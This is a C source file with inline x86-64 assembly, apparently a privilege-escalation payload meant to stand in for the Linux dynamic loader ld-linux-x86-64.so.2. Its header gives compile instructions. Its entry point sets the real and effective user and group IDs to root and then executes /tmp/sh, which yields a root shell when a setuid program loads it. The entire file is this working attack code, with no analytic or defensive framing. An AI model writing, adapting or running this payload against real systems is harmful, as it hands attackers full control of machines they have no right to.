/*
 * librootshell.so — replaces ld-linux-x86-64.so.2
 * Calls setreuid(0,0) then execve(/tmp/sh)
 * Compile: gcc -nostdlib -static -o librootshell.so librootshell_suid.c
 */

void _start(void) {
    /* setreuid(0, 0) */
    __asm__ volatile (
        "xor %%rdi, %%rdi\n"
        "xor %%rsi, %%rsi\n"
        "mov $0x71, %%rax\n"   /* __NR_setreuid = 113 */
        "syscall\n"
        ::: "rax", "rdi", "rsi"
    );

    /* setregid(0, 0) */
    __asm__ volatile (
        "xor %%rdi, %%rdi\n"
        "xor %%rsi, %%rsi\n"
        "mov $0x72, %%rax\n"   /* __NR_setregid = 114 */
        "syscall\n"
        ::: "rax", "rdi", "rsi"
    );

    /* execve("/tmp/sh", {"/tmp/sh", NULL}, NULL) */
    __asm__ volatile (
        "mov $0x68732f706d742f, %%rax\n"  /* "/tmp/sh\0" */
        "push %%rax\n"
        "mov %%rsp, %%rdi\n"              /* path = "/tmp/sh" */
        "push $0\n"
        "push %%rdi\n"
        "mov %%rsp, %%rsi\n"              /* argv = {"/tmp/sh", NULL} */
        "xor %%rdx, %%rdx\n"              /* envp = NULL */
        "mov $0x3b, %%rax\n"              /* __NR_execve = 59 */
        "syscall\n"
        ::: "rax", "rdi", "rsi", "rdx"
    );
}
